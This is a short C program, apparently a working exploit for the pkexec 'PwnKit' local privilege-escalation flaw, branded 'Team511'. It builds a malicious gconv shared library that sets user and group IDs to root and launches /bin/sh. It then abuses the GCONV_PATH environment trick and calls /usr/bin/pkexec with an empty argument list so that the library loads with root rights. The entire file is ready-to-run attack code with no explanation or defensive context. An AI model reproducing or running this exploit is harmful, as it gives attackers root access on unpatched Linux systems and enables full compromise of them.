#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'Team511'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p Team511; echo 'module UTF-8// TEAM511// team511 2' > Team511/gconv-modules");
	fp = fopen("Team511/Team511.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc Team511/Team511.c -o Team511/Team511.so -shared -fPIC");
	char *env[] = { "Team511", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=Team511", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
